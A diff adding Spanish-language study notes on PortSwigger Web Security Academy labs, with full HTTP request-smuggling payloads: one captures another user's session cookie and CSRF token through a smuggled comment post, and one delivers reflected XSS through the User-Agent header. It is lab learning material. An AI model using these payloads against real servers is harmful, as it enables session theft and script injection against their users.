@@ -453,6 +453,52 @@ x=1
 ```
 Finalmente calculamos los nuevos valores de length y mandamos 2 veces dicha peticion y borramos a carlos y resolvemos el lab.
 
+# Exploiting HTTP request smuggling to capture other users' requests
+
+Para este laboratorios se va a capturar la cookie y el token csrf para robar esa sesion 
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+
+csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test 
+
+```
+Cambiamos la peticion poniendo el comentario al utlimo y observamos que si la hace entonces aqui es un claro ejemplo de la naturaleza del ataque
+La vitcitma relaiza una peticion get con todos sus datos cookie csrf y el servidor no sabe donde acaba se confunde y postea los datos del usuario
+los tomas e intentas inciar secion y el lab esta resuelto.
+
+# Exploiting HTTP request smuggling to deliver reflected XSS
+
+```
+POST / HTTP/1.1
+Host: 0aa000750390ce63c08138c70037000e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 158
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+la aplicacion recopila el user agent entonces ( no entedi bien el lab) de alguna forma cierras el value e inyectas el scritp cuanod un usuario haga clic
+pues se inyecta
+
 
 > https://portswigger.net/web-security/request-smuggling
 >  https://string-functions.com/length.aspx
